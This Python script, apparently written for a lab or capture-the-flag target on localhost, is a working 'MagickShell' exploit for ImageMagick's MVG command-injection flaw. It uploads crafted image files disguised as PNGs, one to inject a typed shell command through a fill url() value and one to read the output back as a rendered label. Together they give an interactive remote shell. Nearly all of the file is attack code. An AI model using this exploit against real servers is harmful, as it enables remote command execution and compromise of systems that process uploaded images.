import matplotlib.pyplot as plt
import matplotlib.image as mpimg
import io
import requests
import pyfiglet as figlet
import numpy as np

URL = "http://localhost:3000/"


def get_file(payload: str):
    file = io.StringIO(payload)
    return file


def get_payload(file) -> dict:
    payload = {"picture": ("nothing_obvious.png", file)}
    return payload


def make_request(file_execution: str, read_file: str) -> str:
    response = requests.post(URL + "upload", files=get_payload(file_execution))
    if response.ok:
        response = requests.post(URL + "upload", files=get_payload(read_file))
        return response.json()
    return None


def get_picture(picture_url: str) -> bytes:
    data = requests.get(URL + picture_url)
    return data.content


def main():
    result = figlet.figlet_format("MagickShell", font="banner3-D", width=150)
    print(result)
    read_file = "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0\n'label:@output.txt'\npop graphic-context"

    img = plt.imshow(np.ones([480, 640], dtype=np.float64), cmap="gray", vmin=0, vmax=1)
    while True:
        command = input("MagickShell>> ")
        execute_command = f"push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://example.com/image.jpg\"|{command} > \"output.txt)'\npop graphic-context"

        response = make_request(execute_command, read_file)
        if response is not None:
            data = get_picture(response["picture"])
            img_np = mpimg.imread(io.BytesIO(data), format="jpeg")
            img.set_data(img_np)
            plt.draw()
            plt.pause(1)


if __name__ == "__main__":
    main()
